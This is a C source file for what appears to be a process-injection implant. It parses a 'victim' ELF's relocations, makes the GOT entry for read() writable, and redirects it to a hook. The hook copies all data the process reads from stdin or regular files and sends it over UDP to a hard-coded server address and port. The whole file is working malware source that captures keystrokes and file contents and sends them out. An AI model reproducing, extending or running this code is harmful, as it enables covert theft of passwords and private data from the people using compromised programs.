
// magic.c

#include <elf.h>
#include <stdint.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <linux/sched.h>
#include <sched.h>

#include "elf.h"

#include <stdlib.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/mman.h>

#include <fcntl.h>
#include <sys/stat.h>

#define SERVER_IP "192.168.5.10"
#define SERVER_PORT 5656
#define TIM_BUFFER_SIZE 64
#define IO_BUFFER_SIZE 4096

static char buffer[512];
static char buffer_io[IO_BUFFER_SIZE];
static char time_buffer[TIM_BUFFER_SIZE];

typedef ssize_t (*read_t) (int __fd, void *__buf, size_t __nbytes);
read_t pfn_read = NULL;

const char* SUCC = "\x1b[32m[+]\x1b[0m";
const char* FAIL = "\x1b[31m[-]\x1b[0m";
const char* INFO = "\x1b[34m[*]\x1b[0m";

static struct stat stdin_stat;
static int remote_fd = -1;
static struct sockaddr_in addr;

static void do_rela_reloc(uint64_t base, Elf64_Rela *rela, size_t count)
{
    for (int i = 0; i < count ; i++)
    {
        switch (rela[i].r_info & 0xffffffff) 
        {
        case R_X86_64_RELATIVE:
            *(uint64_t*)(rela[i].r_offset + base) = base + rela[i].r_addend;
            break;
        default:
            break;
        }
    }
}

void do_reloc(uint64_t base, Elf64_Dyn *dynmaic)
{
    int i = 0;
    size_t rela_sz = 0, rela_ent = 0;
    Elf64_Rela *rela_ptr = NULL;

    while (dynmaic[i].d_tag != DT_NULL)
    {
        switch (dynmaic[i].d_tag)
        {
        case DT_RELASZ:
            rela_sz = dynmaic[i].d_un.d_val;
            break;
        case DT_RELAENT:
            rela_ent = dynmaic[i].d_un.d_val;
            break;
        case DT_RELA:
            rela_ptr = (Elf64_Rela*)(dynmaic[i].d_un.d_ptr + base);
            break;
        default:
            break;
        }

        i++;
    }

    if (rela_ptr)
    {
        do_rela_reloc(base, rela_ptr, rela_sz / rela_ent);
    }
}

static void get_current_time(char *buffer, size_t buffer_size) 
{
    time_t raw_time;
    struct tm *time_info;

    // The `time()` function in the C library attempts to use the VDSO,
    // but since we have not initialized it,
    // we need to fallback to the raw system call
    syscall(201, &raw_time);

    time_info = localtime(&raw_time);
    strftime(buffer, buffer_size, "%Y:%m:%d %H:%M:%S \r\n", time_info);
}

int create_thread(uint64_t flags, void* stacktop, void(*entry)());

ssize_t read_hooked(int __fd, void *__buf, size_t __nbytes)
{
    ssize_t r = pfn_read(__fd, __buf, __nbytes);
    if (remote_fd == -1)
    {
        remote_fd = socket(AF_INET, SOCK_DGRAM, 0);
    }

    struct stat st;
    fstat(__fd, &st);

    if ((st.st_dev == stdin_stat.st_dev && st.st_ino == stdin_stat.st_ino) || S_ISREG(st.st_mode))
    {
        char* bb = malloc(r);
        memcpy(bb, __buf, r);

        for (int i = 0; i < r; i += 1)
        {
            if (((char*)bb)[i] == '\r')
                ((char*)bb)[i] = '\n';
        }  

        sendto(remote_fd, bb, r, 0, (const struct sockaddr*)&addr, sizeof(const struct sockaddr));
        free(bb);
    }

    return r;
}

int magic(
    uint64_t self_base, Elf64_Dyn *self_dynmaic, 
    uint64_t victim_base, Elf64_Ehdr *victim_ehdr, 
    char** envp)
{
    printf("%s Booting... base=0x%lx, dynamic=0x%lx, victim_base=0x%lx, victim_ehdr=0x%lx. \r\n", 
        SUCC, self_base, (uint64_t)self_dynmaic, victim_base, (uint64_t)victim_ehdr);

    printf("%s Pid = %d \r\n", INFO, getpid());

    printf("%s Magic = %02x %02x %02x %02x. \r\n", INFO, 
        victim_ehdr->e_ident[0], victim_ehdr->e_ident[1], victim_ehdr->e_ident[2], victim_ehdr->e_ident[3]);

    Elf64_Phdr* phdr = NULL;
    int phdr_sz = get_phdr(victim_base, victim_ehdr, &phdr);
    if (phdr_sz > 0) {
        printf("%s Found %d item(s) in Phdr Table at 0x%lx. \r\n", SUCC, phdr_sz, (uint64_t)phdr);
    } else {
        printf("%s Failed to parse Phdr. \r\n", FAIL);
        exit(-1);
    }

    Elf64_Dyn* dyn = get_dynamic(victim_base, phdr, phdr_sz);
    if (dyn) {
        printf("%s Found Dyncmic segment at 0x%lx. \r\n", SUCC, (uint64_t)dyn);
    } else {
        printf("%s Failed to find dynamic segment. \r\n", FAIL);
        exit(-1);
    }

    struct DymSegment ds;
    parse_dyn_segment(victim_base, dyn, &ds);
    printf("%s ds.rela = 0x%lx. \r\n", INFO, (uint64_t)ds.rela);
    printf("%s ds.rela_ent_count = %d. \r\n", INFO, ds.rela_ent_count);
    printf("%s ds.dynstr = 0x%lx. \r\n", INFO, (uint64_t)ds.dynstr);
    printf("%s ds.dynsym = 0x%lx. \r\n", INFO, (uint64_t)ds.dynsym);

    Elf64_Rela* rela_read = find_sym_rela(victim_base, &ds, "read");
    if (rela_read)
    {
        uint64_t p_sym_read = victim_base + rela_read->r_offset;
        printf("%s Found symbol \"read\" ref to 0x%lx(0x%lx). \r\n", SUCC, p_sym_read, *(uint64_t*)p_sym_read);

        pfn_read = (read_t)(*(uint64_t*)p_sym_read);

        mprotect((void*)(p_sym_read & (~0xFFF)), 0x1000, PROT_READ | PROT_WRITE);
        *(uint64_t*)p_sym_read = (uint64_t)&read_hooked;
        printf("%s Rewrited 0x%lx(0x%lx) => 0x%lx(0x%lx). \r\n", SUCC, p_sym_read, (uint64_t)pfn_read, p_sym_read, *(uint64_t*)p_sym_read);
    }

    fstat(STDIN_FILENO, &stdin_stat);

    struct sockaddr_in l_addr = {
        .sin_zero = 0,
        .sin_addr = inet_addr(SERVER_IP),
        .sin_port = htons(SERVER_PORT),
        .sin_family = AF_INET
    };
    memcpy(&addr, &l_addr, sizeof(struct sockaddr_in));
    
    printf("%s Exiting to Origin Entry. \r\n", SUCC);
    return 0;
}